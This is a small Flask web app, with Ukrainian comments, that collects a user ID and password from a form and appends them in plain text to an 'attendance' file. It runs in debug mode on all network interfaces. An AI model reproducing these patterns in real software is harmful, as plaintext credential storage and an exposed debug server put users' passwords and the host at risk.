from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Шлях до файлу, де будемо зберігати дані
DATA_FILE = 'data/attendance.txt'

# Головна сторінка з формою введення даних
@app.route('/')
def index():
    return render_template('index.html')

# Ендпоінт для обробки даних, введених користувачем
@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        user_id = request.form['userID']
        password = request.form['password']  # Отримання паролю
        with open(DATA_FILE, 'a') as f:
            f.write(f"{user_id},{password}\n")
        return redirect(url_for('index'))

if __name__ == '__main__':
    # Створюємо директорію для зберігання даних, якщо вона не існує
    os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
    # Запуск додатку Flask
    app.run(host='0.0.0.0', port=5000, debug=True)
